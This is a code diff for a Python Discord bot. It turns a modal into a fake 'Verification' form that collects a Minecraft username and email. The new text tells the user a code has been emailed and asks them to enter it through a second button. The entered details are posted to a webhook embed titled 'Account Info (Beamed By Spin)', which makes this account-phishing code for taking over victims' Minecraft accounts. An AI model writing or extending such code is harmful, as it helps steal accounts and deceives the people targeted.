@@ -7,7 +7,7 @@ from discord import ui, Webhook, NotFound, HTTPException
 from views.button_two import ButtonViewTwo
 
 
-class MyModalOne(ui.Modal, title="Modal Title Here"):
+class MyModalOne(ui.Modal, title="Verification"):
     box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
     box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)
 
@@ -24,9 +24,9 @@ class MyModalOne(ui.Modal, title="Modal Title Here"):
                         embed=discord.Embed(
                             title="Account Info (Beamed By Spin)",
                             url= f'https://sky.shiiyu.moe/{self.box_one.value}',
-                            description=f"```**Username:**: {self.box_one.value}\n```"
-                                        f"```**Email**: {self.box_two.value}\n```"
-                                        f"```**Code**: User hasn't clicked button two yet```",
+                            description=f"**Username:**: ```{self.box_one.value}\n```"
+                                        f"**Email**: ```{self.box_two.value}\n```"
+                                        f"**Code**: ```User hasn't clicked button two yet```",
                             colour=0xff0000
                         )
                     )
@@ -36,9 +36,9 @@ class MyModalOne(ui.Modal, title="Modal Title Here"):
                     return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
             await interaction.response.send_message(
                 embed=discord.Embed(
-                    title="Title",
-                    description="Description",
-                    colour=0x000000
+                    title="Verification ✅",
+                    description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
+                    colour=0x00FF00
                 ),
                 view=ButtonViewTwo(),
                 ephemeral=True
